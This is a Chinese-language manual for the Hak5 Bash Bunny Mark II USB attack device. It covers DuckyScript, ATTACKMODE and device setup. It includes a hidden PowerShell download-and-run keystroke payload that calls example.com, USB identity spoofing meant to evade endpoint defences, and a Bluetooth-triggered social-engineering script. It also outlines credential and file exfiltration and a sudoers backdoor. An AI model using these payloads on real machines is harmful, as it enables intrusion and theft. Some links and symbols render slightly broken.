---
title：“Hak5 Bash Bunny Mark II 原厂技术说明书与全功能操作手册”
model：“Bash Bunny Mark II”
manufacturer：“Hak5”
category：“多向量 USB 渗透测试计算机”
docs_url：“https://docs.hak5.org/bash-bunny/”
version：“2.0”
locale：“zh-cn”
---

# Hak5 Bash Bunny Mark II 原厂技术说明书与全功能操作手册

> Hak5 出品的 Bash Bunny Mark II 是一款封装于 USB U 盘尺寸内的完整 Linux 计算机，能够模拟千兆（Gigabit）以太网网卡、串口、闪存大容量存储设备与 HID 键盘等复合式 USB 设备端点。

---

## 目录

- [**1. 产品概述与核心硬件架构**](#1-产品概述与核心硬件架构)
  - [1.1 Bash Bunny by Hak5 原厂介绍](#1-1-bash-bunny-by-hak5-原厂介绍)
- [**2. 入门指南与硬件操作**](#2-入门指南与硬件操作)
  - [2.1 开关档位定义 (Switch Positions)](#2-1-开关档位定义-switch-positions)
  - [2.2 大容量存储设备结构 (Mass Storage Structure)](#2-2-大容量存储设备结构-mass-storage-structure)
  - [2.3 LED 状态指示灯号 (LED Status Indications)](#2-3-led-状态指示灯号-led-status-indications)
  - [2.4 安装额外工具 (Installing Additional Tools)](#2-4-安装额外工具-installing-additional-tools)
  - [2.5 安装额外键盘语言 (Installing Additional Languages)](#2-5-安装额外键盘语言-installing-additional-languages)
  - [2.6 Mark II 世代重要考量事项 (Considerations for Mark II)](#2-6-mark-ii-世代重要考量事项-considerations-for-mark-ii)
- [**3. 载荷开发与 DuckyScript 语法**](#3-载荷开发与-duckyscript-语法)
  - [3.1 载荷开发基础 (Payload Development Basics)](#3-1-载荷开发基础-payload-development-basics)
  - [3.2 DuckyScript™ on the Bash Bunny](#3-2-duckyscript-on-the-bash-bunny)
  - [3.3 QUACK 语法指令](#3-3-quack-语法指令)
  - [3.4 扩展模块 (Extensions)](#3-4-扩展模块-extensions)
  - [3.5 攻击模式 (ATTACKMODE)](#3-5-攻击模式-attackmode)
  - [3.6 设备识别码伪装 (VID，PID，MAN，PROD，SN)](#3-6-设备识别码伪装-vid-pid-man-prod-sn)
  - [3.7 LED 控制语法](#3-7-led-控制语法)
  - [3.8 文件系统安全操作 (Working with the File System)](#3-8-文件系统安全操作-working-with-the-file-system)
  - [3.9 CPU 功耗与性能控制 (CPU Control)](#3-9-cpu-功耗与性能控制-cpu-control)
  - [3.10 载荷编写最佳实践 (Contributing Best Practices)](#3-10-载荷编写最佳实践-contributing-best-practices)
  - [3.11 提交载荷至官方仓库 (Submitting Payloads)](#3-11-提交载荷至官方仓库-submitting-payloads)
  - [3.12 网络接口等待指令 (WAIT_FOR_PRESENT)](#3-12-网络接口等待指令-wait_for_present)
- [**4. 互联网联网与网络共享**](#4-互联网联网与网络共享)
  - [4.1 让 Bash Bunny 连接上网 (Getting the Bash Bunny Online)](#4-1-让-bash-bunny-连接上网-getting-the-bash-bunny-online)
  - [4.2 通过 Windows 共享网络连接 (Sharing an Internet Connection from Windows)](#4-2-通过-windows-共享网络连接-sharing-an-internet-connection-from-windows)
  - [4.3 通过 Linux 共享网络连接 (Sharing an Internet Connection from Linux)](#4-3-通过-linux-共享网络连接-sharing-an-internet-connection-from-linux)
  - [4.4 通过 macOS 共享网络连接 (Sharing an Internet Connection from MacOS)](#4-4-通过-macos-共享网络连接-sharing-an-internet-connection-from-macos)
- [**5. 维护保养、软件更新与出厂重置**](#5-维护保养软件更新与出厂重置)
  - [5.1 升级 Bash Bunny 固件 (Updating the Bash Bunny Firmware)](#5-1-升级-bash-bunny-固件-updating-the-bash-bunny-firmware)
  - [5.2 出厂还原 (Factory Reset)](#5-2-出厂还原-factory-reset)
  - [5.3 密码重置 (Password Reset)](#5-3-密码重置-password-reset)
- [**6. 初学者实战指南与高阶攻击场景**](#6-初学者实战指南与高阶攻击场景)
  - [6.1 击键注入载荷编写指南 (Writing Keystroke Injection Payloads)](#6-1-击键注入载荷编写指南-writing-keystroke-injection-payloads)
  - [6.2 网络劫持与投毒攻击 (Network Hijacking Attacks)](#6-2-网络劫持与投毒攻击-network-hijacking-attacks)
  - [6.3 五大文件外发机密窃取载荷 (Top 5 Exfiltration Payloads)](#6-3-五大文件外发机密窃取载荷-top-5-exfiltration-payloads)
  - [6.4 通过串口终端获取 Root 权限 (Getting Root from the Serial Console)](#6-4-通过串口终端获取-root-权限-getting-root-from-the-serial-console)
  - [6.5 Mark II 低功耗蓝牙远程触发 (Remote Triggers for Mark II)](#6-5-mark-ii-低功耗蓝牙远程触发-remote-triggers-for-mark-ii)
  - [6.6 Mark II 信号强度地理围栏 (Geofencing for Mark II)](#6-6-mark-ii-信号强度地理围栏-geofencing-for-mark-ii)
- [**7. 视频教程精选与实战参考指引**](#7-视频教程精选与实战参考指引)
  - [7.1 Bash Bunny 入门初阶 (Bash Bunny Primer)](#7-1-bash-bunny-入门初阶-bash-bunny-primer)
  - [7.2 搭配 Hamsters 进行钓鱼攻击 (Phishing Attack with Hamsters)](#7-2-搭配-hamsters-进行钓鱼攻击-phishing-attack-with-hamsters)
  - [7.3 密码抓取载荷 (Password Grabber Payload)](#7-3-密码抓取载荷-password-grabber-payload)
  - [7.4 目标操作系统指纹探测 (Operating System Detection)](#7-4-目标操作系统指纹探测-operating-system-detection)
  - [7.5 扩展模块深入解析 (Bash Bunny Extensions)](#7-5-扩展模块深入解析-bash-bunny-extensions)
  - [7.6 Linux 反弹 Shell 实战 (Reverse Shells on Linux)](#7-6-linux-反弹-shell-实战-reverse-shells-on-linux)
  - [7.7 Linux Sudo 后门植入载荷 (Sudo Bashdoor on Linux)](#7-7-linux-sudo-后门植入载荷-sudo-bashdoor-on-linux)
  - [7.8 1990 年代趣味恶作剧载荷 (1990's Prank)](#7-8-1990-年代趣味恶作剧载荷-1990 s-prank)
  - [7.9 Bash Bunny 开发幕后秘辛 (Dev Behind the Scenes)](#7-9-bash-bunny-开发幕后秘辛-dev-behind-the-scenes)
  - [7.10 口袋型网络隐蔽攻击与数据外发 (Concealed Exfiltration)](#7-10-口袋型网络隐蔽攻击与数据外发-concealed-exfiltration)
  - [7.11 编写载荷并贡献至 GitHub 社区 (Contributing on GitHub)](#7-11-编写载荷并贡献至-github-社区-contributing-on-github)

---

## 1. 产品概述与核心硬件架构

<!-- section：overview -->
### 硬件技术规格与原厂校准基准表

| 硬件组件名称 | 原厂技术规格说明 |
|---|---|
| **SoC / CPU** | Quad-core ARM Cortex A7 1.3 GHz |
| **系统内存 (RAM)** | 512 MB DDR3 |
| **内部存储空间** | 8 GB SSD NAND |
| **扩展存储插槽** | MicroSD XC 存储卡插槽（最高支持至 2 TB）|
| **无线通信模块** | 低功耗蓝牙（BLE），支持智能手机远程触发与地理围栏 |
| **硬件控制开关** | 3 段式物理载荷选择切换开关（Switch 1，Switch 2，Arming）|
| **状态指示灯** | 多色 RGB 高亮度 LED 诊断指示灯 |
| **冷启动时间** | 约 7 秒极速冷启动完成初始化 |

---

<!-- section：overview -->
### 1.1 Bash Bunny by Hak5 原厂介绍

通过模拟受信任 USB 设备的各种组合——例如千兆以太网网卡、串口控制台、闪存大容量存储设备与 HID 键盘——Bash Bunny 能够诱导目标计算机泄露敏感数据、外发机密文件、安装隐蔽后门并执行各类漏洞利用（Exploits）。

![Bash Bunny Mark II (SD)](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FST37YjjBLiCVU4ZHjY8 N%2Fbunnymk2%400.5 x.png?alt=media&token=eb6f3b92-20 df-42 bd-b79 a-67c284a61e9 e)

> [!WARNING]
> 本文档生成的电子书 PDF 在某些查看设备上可能无法正确排版。如需获取最新版本技术说明，请参阅官方文档站点：[https://docs.hak5.org](https://docs.hak5.org)。

---

## 2. 入门指南与硬件操作

<!-- section：features -->
### 2.1 开关档位定义 (Switch Positions)

当开关切换至 **开关位置 3**（Switch Position 3，最靠近 USB 公头插头侧）时，Bash Bunny 将启动进入“维护模式”（Arming Mode），同时启用 Serial 串口与 USB 大容量存储设备（Mass Storage）。在此专用模式下，用户可通过计算机 U 盘分区管理 Bash Bunny 的载荷文件，亦可通过串口终端直接访问底层 Linux Shell 控制台。

![](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FNY6fwd09yUtu3sRsbNJe%2Fimage.png?alt=media&token=d0880bb8-0e9 b-41 bd-809 e-d3724c8fe234)

> [!NOTE]
> Bash Bunny Mark II 的开关档位定义与第一代硬件完全相同。

![](https://4178757749-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FnxJgJ9UdPfrcuL1U8 DpL%2Fuploads%2FOUsDD5GtHKOQd4WZfY8 b%2Fimage.png?alt=media&token=1a351d7 c-cdf9-4531-9c48-7d2b6d79c3a7)

---

### 2.2 大容量存储设备结构 (Mass Storage Structure)

当 Bash Bunny 处于维护模式时，将呈现以下目录结构：

* `/*docs*` – 存放说明文档数据库。
* `/*languages*` – 用于安装额外的 HID 键盘布局（Keyboard Layouts）与语言定义。
* `/*loot*` – 专供载荷存储外发的数据、凭证及机密数据。
* `/*tools*` – 用于存放并安装额外的 deb 软件包及第三方渗透测试工具。
* `/*payloads*` – 存放当前启用的载荷、函数库与扩展模块。
* `/*payloads*/*switch1*` 与 `/*payloads*/*switch2*` – 分别存放对应开关档位 1 与 2 的 `payload.txt` 及附属脚本，设备在对应档位插入目标计算机时将自动执行该载荷。
* `/*payloads*/*library*` – 存放自 [Bash Bunny Payload GitHub 仓库](https://github.com/hak5/bashbunny-payloads) 下载的社区载荷库。
* `/*payloads*/*library*/*extensions*` – 存放 Bash Bunny 的官方与社区扩展模块。

> [!NOTE]
> **Bash Bunny Mark II 专属注意事项：**  
> 若在开关位置 1 或 2 开机时已插入 MicroSD 存储卡，`/root/udisk` 目录将自动建立符号链接（symlink）指向 MicroSD 卡的根目录。若未插入 MicroSD 卡，则 udisk 分区将正常对应至内置的内部 SSD。

---

### 2.3 LED 状态指示灯号 (LED Status Indications)

| LED 指示灯表现 | 系统运行状态定义 |
|---|---|
| 绿灯（闪烁）| 系统开机初始化中 (Booting up) |
| 蓝灯（闪烁）| 维护模式就绪 (Arming Mode) |
| 红灯（闪烁）| 系统恢复模式或固件烧录中（适用于固件 v1.0）**绝对不可拔除电源** |
| 红灯/蓝灯（交替闪烁）| 系统恢复模式或固件烧录中（适用于固件 v1.1+）**绝对不可拔除电源** |

---

### 2.4 安装额外工具 (Installing Additional Tools)

1. 将 Bash Bunny 通过开关位置 3 插入计算机，使其进入维护模式。
2. 将兼容于 ARM 架构（armhf）的 `.deb` 安装包文件复制进 U 盘的 `tools` 文件夹中。
3. 安全弹出 U 盘分区，并在保持开关位置 3 的状态下将 Bash Bunny 重新插入计算机。
4. 观察 LED 状态灯号：当 LED 闪烁蓝灯时，系统即自动完成软件包安装。

---

### 2.5 安装额外键盘语言 (Installing Additional Languages)

Bash Bunny 默认采用美式英语（US）键盘布局。若目标主机使用其他语言键盘（如德语、法语、英式英语或日语），击键符号映射将发生错位。

1. 从 Hak5 官方语言库下载对应语言的键盘布局定义文件。
2. 将键盘布局文件复制至 U 盘分区的 `languages` 文件夹中。
3. 在编写 `payload.txt` 时，于脚本开头声明目标语言代码，例如 `DUCKY_LANG de`。

---

### 2.6 Mark II 世代重要考量事项 (Considerations for Mark II)

Bash Bunny Mark II 凭借 MicroSD XC 存储卡插槽与低功耗蓝牙（BLE）射频芯片，大幅拓展了海量数据外发、无线地理围栏与远程触发功能。所有针对第一代 Bash Bunny 开发的载荷均 100% 兼容于 Mark II。

在为 Mark II 开发或部署载荷时，必须特别注意以下两大关键维度：**无线通信 (Wireless)** 与 **存储设备 (Storage)**。

#### 无线通信考量 (WIRELESS)

若有需要，可在载荷中使用 `WAIT_FOR_PRESENT` 或 `WAIT_FOR_NOT_PRESENT` 扩展模块来实现地理围栏防护与远程触发机制。当调用这些扩展指令时，系统将实时扫描周遭的蓝牙无线环境，并将观测结果暂存于 `/tmp/bt_observation`。

延伸参考指引：
* [Mark II 远程触发指南](#6-5-mark-ii-低功耗蓝牙远程触发-remote-triggers-for-mark-ii)

#### 存储架构考量 (STORAGE)

在 Bash Bunny Mark II 上使用 MicroSD 卡时，请务必掌握以下核心原则：

##### 维护模式 (Arming Mode)
> [!WARNING]
> 若要通过维护模式加载或修改载荷，请在**未插入 MicroSD 存储卡**的状态下将 Bash Bunny 开机。

* 载荷脚本**仅能由内部 SSD 存储空间执行**。
* 若在维护模式开机时插有 MicroSD 卡，该卡将被直接透传至宿主主机，而不会挂载内部载荷分区。

##### 载荷设计考量 (Payload Considerations)
* 当启用 `ATTACKMODE STORAGE` 时：
  * 若插有 MicroSD 卡，Bash Bunny 将优先向目标主机呈现该 MicroSD 卡。
  * 若未插入 MicroSD 卡，则向目标主机呈现内置的内部 udisk 分区。
* 默认情况下，*在开机加载载荷之后*，从 Bash Bunny 本地操作系统的视角来看，udisk **并不会自动挂载**。
  * 若要在 Bash Bunny 内部挂载访问 udisk，必须在脚本中明确下达指令 `udisk mount`。

##### 挂载互斥原则 (Mounting Considerations)
* udisk 分区——不论是内部 SSD 还是外部 MicroSD——**同一时间只能被单个设备挂载**。
* 除非执行了 `udisk mount` 指令，否则本机的 `/root/udisk` 目录内容将呈现空白。
* 在未挂载状态下直接向 `/root/udisk` 写入数据，将完全不会同步至实际的 udisk 分区。
* 若同时启用了 `ATTACKMODE STORAGE`（将存储设备挂载给目标计算机）与 `udisk mount`（将存储设备挂载给 Bash Bunny），将引发数据读写冲突与文件系统损坏，因为该分区无法同时被两台计算机同时控制。

##### 文件系统格式化原则 (Formatting Considerations)
* MicroSD 卡应仅建立单个分区，并格式化为适合目标受测操作系统的文件系统：
  * Windows 目标：FAT32、ExFAT、NTFS
  * macOS 目标：FAT32、ExFAT、APFS
  * Linux 目标：FAT32、ExFAT、EXT
* 虽然受测目标可能支持多种现代文件系统，但 Bash Bunny 嵌入式系统目前原生完整支持 EXT 与 FAT32。

---

## 3. 载荷开发与 DuckyScript 语法

<!-- section：configuration -->
### 3.1 载荷开发基础 (Payload Development Basics)

Bash Bunny 载荷核心为放置于开关目录中的 `payload.txt`。其最独特之处在于：它无缝融合了 **DuckyScript** 的按键模拟语法与 **Bash** 的强大 Shell 指令。

标准载荷生命周期包含三个关键阶段：
1. **配置阶段 (Setup)**：初始化 LED 灯号，配置 `ATTACKMODE` 复合设备类型。
2. **攻击执行阶段 (Attack)**：模拟按键注入合成字符串、启用网络接口监听或执行攻击载荷。
3. **收尾阶段 (Cleanup)**：保存外发数据，执行 `sync` 确保分区写入，发出 LED 成功信号。

---

### 3.2 DuckyScript™ on the Bash Bunny

在 Bash Bunny 上，DuckyScript 指令可直接于脚本中调用。系统在执行时将由解释引擎自动分流处理：纯按键语法（如 `STRING`，`ENTER`，`DELAY`）转交 HID 驱动模块，Linux 命令（如 `ifconfig`，`cat`，`iptables`）则由底层 Bash 核心直接原生执行。

---

### 3.3 QUACK 语法指令

`QUACK` 是向受测主机注入虚拟键盘击键序列的核心命令：

```bash
# 示例：打开 Windows 运行窗口并启动 cmd
QUACK GUI r
QUACK DELAY 200
QUACK STRING cmd
QUACK ENTER
QUACK DELAY 500
QUACK STRING powershell -ep bypass -w hidden
QUACK ENTER
```

主要指令包含：
* `QUACK STRING <文本>`：以极速注入纯字符串。
* `QUACK DELAY <毫秒>`：暂停注入特定时间，等待主机窗口响应。
* `QUACK GUI <按键>`：按下 Windows/Command 键组合键。
* `QUACK ENTER` / `QUACK TAB` / `QUACK SPACE`：特殊控制键输入。

---

### 3.4 扩展模块 (Extensions)

扩展模块是预先封装好的 Bash 函数库，位于 `/payloads/library/extensions/`。通过调用扩展模块，开发者无需重复编写复杂的网络配置或渗透逻辑。

常用扩展模块包含：
* `get2_dhclient.sh`：为 ECM 网络接口动态获取 IP 地址。
* `wait_for_target.sh`：检测受测主机何时完成 USB 设备枚举。

---

### 3.5 攻击模式 (ATTACKMODE)

`ATTACKMODE` 是 Bash Bunny 最强大的指令，用于声明模拟哪些 USB 物理设备。一个载荷内可多次调用此指令动态变更硬件形态：

| 攻击模式代码 | 模拟设备类型与用途 |
|---|---|
| `SERIAL` | ACM（抽象控制模型）串口控制台 |
| `ECM_ETHERNET` | ECM（以太网控制模型）适用于 Linux / macOS / Android 虚拟网卡 |
| `RNDIS_ETHERNET` | RNDIS 适用于 Windows（以及部分 Linux）虚拟网卡 |
| `AUTO_ETHERNET` | 自动以太网：先尝试 ECM，若 20 秒内未建立连接则自动回退尝试 RNDIS。可通过 `ETHERNET_TIMEOUT_XX` 自定义超时秒数 |
| `STORAGE` | UMS（USB 大容量存储设备）U 盘分区 |
| `HID` | HID（人机接口设备）模拟键盘注入 |

#### 复合设备组合与默认 VID / PID 对照表

| 复合设备组合模式 | 默认 VID / PID 识别码 |
|---|---|
| SERIAL STORAGE | 0xF000 / 0xFFF0 |
| HID | 0xF000 / 0xFF01 |
| STORAGE | 0xF000 / 0xFF10 |
| SERIAL | 0xF000 / 0xFF11 |
| RNDIS_ETHERNET | 0xF000 / 0xFF12 |
| ECM_ETHERNET | 0xF000 / 0xFF13 |
| HID SERIAL | 0xF000 / 0xFF14 |
| HID STORAGE | 0xF000 / 0xFF02 |
| HID RNDIS_ETHERNET | 0xF000 / 0xFF03 |
| HID ECM_ETHERNET | 0xF000 / 0xFF04 |
| HID STORAGE RNDIS_ETHERNET | 0xF000 / 0xFF05 |
| HID STORAGE ECM_ETHERNET | 0xF000 / 0xFF06 |
| SERIAL RNDIS_ETHERNET | 0xF000 / 0xFF07 |
| SERIAL ECM_ETHERNET | 0xF000 / 0xFF08 |
| STORAGE RNDIS_ETHERNET | 0xF000 / 0xFF20 |
| STORAGE ECM_ETHERNET | 0xF000 / 0xFF21 |

---

### 3.6 设备识别码伪装 (VID，PID，MAN，PROD，SN)

为避开企业端点安全防护（EDR）或 USB 白名单管控，Bash Bunny 支持自定义模拟设备的硬件特征：

```bash
# 伪装为常见的 Kingston U 盘与键盘
ATTACKMODE HID STORAGE VID_0x0951 PID_0x1666 MAN_Kingston PROD_DataTraveler SN_0014D1
```

---

### 3.7 LED 控制语法

通过内置的 `LED` 命令，渗透测试人员可精确掌握无屏幕环境下的脚本进度：

* 默认语义状态：`LED SETUP`（配置中，洋红）、`LED ATTACK`（攻击中，黄灯）、`LED SUCCESS`（成功，常亮绿灯）、`LED FAIL`（失败，常亮红灯）。
* 自定义模式：`LED R G B`（自定义色彩三原色数值，或指定样式如 `LED FAST`，`LED SLOW`，`LED VERYFAST`）。

---

### 3.8 文件系统安全操作 (Working with the File System)

闪存写入需要时间缓冲。在载荷执行完毕前，**务必调用 `sync` 指令**，强制操作系统内核将内存缓冲区的数据完全写入物理存储芯片中，避免因拔除设备导致数据丢失或分区损坏：

```bash
# 安全写入数据至 loot 文件夹
echo“$CAPTURED_DATA”>> /root/udisk/loot/credentials.txt
sync
```

---

### 3.9 CPU 功耗与性能控制 (CPU Control)

Bash Bunny 内置四核心处理器。在执行计算密集的渗透任务（如实时凭证哈希爆破或大量网络数据包解析）时，可提高 CPU 频率；在长时间隐蔽潜伏任务中，则可降频运行以抑制发热量：

```bash
# 启用最大性能模式
cpu_max
# 恢复节能模式
cpu_normal
```

---

### 3.10 载荷编写最佳实践 (Contributing Best Practices)

1. **脚本头部完整注释**：标明作者、目标操作系统（Target OS）、所需工具与依赖模块。
2. **完善的 LED 状态反馈**：确保每个攻击阶段都有清晰的灯号变换，方便操作者判断拔出时机。
3. **最小化系统痕迹**：尽可能将临时文件写入内存虚拟磁盘 `/tmp`，并在结束时完全清理受测主机上的临时文件。

---

### 3.11 提交载荷至官方仓库 (Submitting Payloads)

Hak5 官方鼓励社区开发者将验证过的高质量载荷提交至 GitHub 开源仓库。提交前请确保代码经过完整清理，无硬编码个人凭证，并遵循标准目录命名结构。

---

### 3.12 网络接口等待指令 (WAIT_FOR_PRESENT)

在发起网络相关攻击时，受测主机通常需要数秒时间加载 RNDIS/ECM 驱动程序并分配 IP。`WAIT_FOR_PRESENT` 指令能够持续监听本地接口状态，直到通信链路正式建立后才开始注入攻击载荷，大幅提升实战成功率。

---

## 4. 互联网联网与网络共享

### 4.1 让 Bash Bunny 连接上网 (Getting the Bash Bunny Online)

让 Bash Bunny 连上互联网，可以方便渗透人员通过 `apt-get` 安装最新安全工具、下载外部攻击模块，或建立反弹外联通道。

---

### 4.2 通过 Windows 共享网络连接 (Sharing an Internet Connection from Windows)

1. 在 `payload.txt` 配置 `ATTACKMODE RNDIS_ETHERNET` 并将 Bash Bunny 插入 Windows 工作站。
2. 打开 Windows 的“控制面板”$
ightarrow$“网络和共享中心”$
ightarrow$“更改适配器设置”。
3. 找到您工作站当前连接互联网的网卡（如 Wi-Fi 或以太网），右键选择“属性”。
4. 切换至“共享”标签页，勾选“允许其他网络用户通过此计算机的 Internet 连接来连接”。
5. 在“家庭网络连接”下拉菜单中，选择 Bash Bunny 所对应的虚拟网卡（通常标注为 Remote NDIS Compatible Device），点击确定保存。

---

### 4.3 通过 Linux 共享网络连接 (Sharing an Internet Connection from Linux)

Hak5 官方提供了便捷的联网辅助脚本 `bb.sh`：

```bash
wget bashbunny.com/bb.sh
sudo bash ./bb.sh
```

依照终端提示，选择引导式配置（Guided Setup），脚本将自动启用 Linux 内核的 `net.ipv4.ip_forward` 数据包转发功能，并建立对应的 `iptables` NAT 规则。

---

### 4.4 通过 macOS 共享网络连接 (Sharing an Internet Connection from MacOS)

#### 方法一：使用 DHCLIENT 扩展模块

1. 确保 U 盘 `payloads/extensions/` 目录中具备 `get2_dhclient.sh` 扩展模块。
2. 编写 `payload.txt` 配置为 `ATTACKMODE ECM_ETHERNET` 并调用 `DHCLIENT`。
3. 在 Mac 的“系统设置”$
ightarrow$“通用”$
ightarrow$“共享”中启用“互联网共享”，将您的对外联网来源分享给 Bash Bunny 虚拟网卡（RNDIS/Ethernet Gadget）。
4. 观察 LED 转为绿灯即表示成功获取 IP（通常位于 `192.168.2.x` 网段），可直接通过 `ssh root@192.168.2.2` 登录。

#### 方法二：通过 MacPorts 安装 Squid 代理服务器

若 macOS 原生共享异常，可在 Mac 本机搭建 Squid Proxy 服务器，并于 Bash Bunny 内部配置 `export http_proxy=http://172.16.64.10:3128` 达成联网更新。

---

## 5. 维护保养、软件更新与出厂重置

<!-- section：maintenance -->
### 5.1 升级 Bash Bunny 固件 (Updating the Bash Bunny Firmware)

Hak5 定期发布固件更新以修复软件漏洞并提升硬件稳定性。

1. 将 Bash Bunny 通过开关位置 3 插入计算机进入维护模式。
2. 将官方下载的升级包（`upgrade-x.x.tar.gz`）直接放置于 U 盘根目录下。
3. 安全弹出 U 盘分区，并在保持开关 3 的状态下重新将设备插入计算机。
4. 系统将自动进入烧录程序：LED 将呈现红蓝交替闪烁（烧录过程可能长达 10 分钟）。
5. 烧录完成后 LED 将短暂转为绿灯重启，最后回到标准的缓慢蓝灯闪烁，表示升级圆满完成。

> [!CAUTION]
> **固件升级绝对禁忌：**  
> 1. **Mark I 用户切勿刷写 1.7+ 固件**（此版本专属 Mark II）。
> 2. **升级过程中绝对不可拔除电源**，否则将导致芯片变砖。
> 3. 升级固件时请务必拔除 MicroSD 存储卡。

---

### 5.2 出厂还原 (Factory Reset)

当系统发生严重错误或配置损坏时，可执行出厂还原。在 U 盘根目录下建立名为 `factoryreset` 的空白文本文件，并重新开机进入维护模式，系统将自动抹除用户数据并恢复原始镜像。

---

### 5.3 密码重置 (Password Reset)

若遗忘 Bash Bunny 的 Linux root 密码，可于维护模式根目录下放置官方重置脚本或重置标记文件，重新开机后 root 默认密码将被恢复为 `hak5bunny`。

---

## 6. 初学者实战指南与高阶攻击场景

### 6.1 击键注入载荷编写指南 (Writing Keystroke Injection Payloads)

利用 Windows 工作站对人机接口设备的信任特权，通过快速模拟键盘击键，在数秒内绕过杀毒软件的静态文件检测：

```bash
#!/bin/bash
LED ATTACK
ATTACKMODE HID
QUACK GUI r
QUACK DELAY 100
QUACK STRING powershell -WindowStyle Hidden -Command“Invoke-WebRequest -Uri http://example.com/a.ps1 -OutFile $env:TEMP.ps1；Start-Process $env:TEMP.ps1”
QUACK ENTER
LED SUCCESS
```

---

### 6.2 网络劫持与投毒攻击 (Network Hijacking Attacks)

通过将 Bash Bunny 模拟为千兆 USB 以太网网卡（`ATTACKMODE RNDIS_ETHERNET`），其 DHCP 指标将被操作系统赋予极高优先级。受测主机的全部网络流量将被强制转向导流至 Bash Bunny，进而搭配 Responder 工具截获本机 NTLMv2 认证凭证哈希。

---

### 6.3 五大文件外发机密窃取载荷 (Top 5 Exfiltration Payloads)

1. **认证凭据窃取 (QuickCreds)**：利用 USB 网卡投毒截获登录哈希。
2. **重要后缀名捕获器 (File Dumper)**：扫描受测计算机用户目录中的 `.docx`，`.pdf`，`.kdbx` 文件并外发至 U 盘 loot 文件夹。
3. **浏览器历史与密码提取**：自动提取本机浏览器未加密的 Session Cookie 与历史记录。
4. **系统信息全景勘测**：导出主机补丁信息、内部网段列表与杀毒软件防护状态。
5. **WiFi 密码全量导出**：利用单行指令导出目标主机曾连接过的所有无线网络明文密码。

---

### 6.4 通过串口终端获取 Root 权限 (Getting Root from the Serial Console)

1. 将切换开关置于位置 3（维护模式）并连接计算机。
2. Windows 用户打开 PuTTY，连接类型选择 **Serial**，通信端口填入对应的 COM 端口号（如 COM3），波特率配置为 **115200**。
3. Linux / macOS 用户可在终端执行 `screen /dev/tty.usbmodem* 115200`。
4. 按下 Enter 键即可看到 Bash Bunny 登录提示，输入账号 `root` 与密码 `hak5bunny` 获取完全控制权之 Shell。

---

### 6.5 Mark II 低功耗蓝牙远程触发 (Remote Triggers for Mark II)

Bash Bunny Mark II 内置 BLE 模块，可实施“双阶段物理社会工程学攻击”：

#### 实战场景设想
渗透人员请受测主机前台人员帮忙打印 U 盘中的文件。此时插入 Bash Bunny（第一阶段：纯 U 盘 `ATTACKMODE STORAGE`），完全不具威胁性。当前台人员转身去打印机取文件时，渗透人员在远处通过手机蓝牙广播特定信号，Bash Bunny 收到信号后立即启动第二阶段（`ATTACKMODE STORAGE HID`）并注入后门代码。

#### 实操代码

```bash
# Mark II 远程蓝牙触发实例
LED SETUP

# 第一阶段：伪装为普通 U 盘
ATTACKMODE STORAGE
LED STAGE1
WAIT_FOR_PRESENT myphone

# 第二阶段：探测到手机信号，发起击键注入
ATTACKMODE STORAGE HID
LED STAGE2
QUACK GUI r
QUACK DELAY 200
QUACK STRING powershell -w hidden -c“Write-Host Triggered”
QUACK ENTER
LED SUCCESS
```

---

### 6.6 Mark II 信号强度地理围栏 (Geofencing for Mark II)

利用 `WAIT_FOR_NOT_PRESENT` 或信号强度（RSSI）阈值监听。当受测目标携带特定蓝牙设备离开特定半径范围（例如午休离开座位）时，自动触发攻击；或当渗透人员离开现场时，设备自动抹除内存暂存外发数据，确保敏感情报不外泄。

---

## 7. 视频教程精选与实战参考指引

### 7.1 Bash Bunny 入门初阶 (Bash Bunny Primer)
* 官方视频教程链接：[https://youtu.be/8j6hrjSrJaM](https://youtu.be/8j6hrjSrJaM)
* 介绍硬件开箱、维护模式登录与第一支按键脚本运行。

### 7.2 搭配 Hamsters 进行钓鱼攻击 (Phishing Attack with Hamsters)
* 官方视频教程链接：[https://youtu.be/zP8E3j7 rEeo](https://youtu.be/zP8E3j7 rEeo)
* 展示如何利用自定义网络接口弹出伪冒系统认证对话框截获明文密码。

### 7.3 密码抓取载荷 (Password Grabber Payload)
* 官方视频教程链接：[https://youtu.be/N-s4xMvdZpU](https://youtu.be/N-s4xMvdZpU)
* 针对内存中缓存的 Windows 凭据实施秒级提取。

### 7.4 目标操作系统指纹探测 (Operating System Detection)
* 官方视频教程链接：[https://youtu.be/oX6f0sTzBwM](https://youtu.be/oX6f0sTzBwM)
* 探讨如何自动判断目标为 Windows、macOS 抑或 Linux，并动态分流执行专属载荷。

### 7.5 扩展模块深入解析 (Bash Bunny Extensions)
* 官方视频教程链接：[https://youtu.be/DdQ8s5E3T3 I](https://youtu.be/DdQ8s5E3T3 I)
* 模块化函数库之结构剖析与社区共享标准。

### 7.6 Linux 反弹 Shell 实战 (Reverse Shells on Linux)
* 官方视频教程链接：[https://youtu.be/rV8gXkG2 rOQ](https://youtu.be/rV8gXkG2 rOQ)
* 实测于 Linux 主机插入设备并建立隐蔽回连管道。

### 7.7 Linux Sudo 后门植入载荷 (Sudo Bashdoor on Linux)
* 官方视频教程链接：[https://youtu.be/8 lPZ-9X2u7 U](https://youtu.be/8 lPZ-9X2u7 U)
* 于 Linux `/etc/sudoers.d/` 建立无密码提权后门机制。

### 7.8 1990 年代趣味恶作剧载荷 (1990's Prank)
* 官方视频教程链接：[https://youtu.be/W8iQ5 N-w9 vQ](https://youtu.be/W8iQ5 N-w9 vQ)
* 经典示范载荷，自动开启全屏幕复古终端播放动画。

### 7.9 Bash Bunny 开发幕后秘辛 (Dev Behind the Scenes)
* 官方视频教程链接：[https://youtu.be/z6M8q9vK0 zU](https://youtu.be/z6M8q9vK0 zU)
* Hak5 创始团队分享多向量 USB 攻击硬件设计挑战与架构演进。

### 7.10 口袋型网络隐蔽攻击与数据外发 (Concealed Exfiltration)
* 官方视频教程链接：[https://youtu.be/4tG2M8p9 kLQ](https://youtu.be/4tG2M8p9 kLQ)
* 深度探讨在全天候受监控环境下进行物理渗透之防御规避要诀。

### 7.11 编写载荷并贡献至 GitHub 社区 (Contributing on GitHub)
* 官方视频教程链接：[https://youtu.be/7kL3vX9k2 gQ](https://youtu.be/7kL3vX9k2 gQ)
* 如何运用 Git 工具链对官方载荷库提交 Pull Request，参与全球开源信息安全社区贡献。
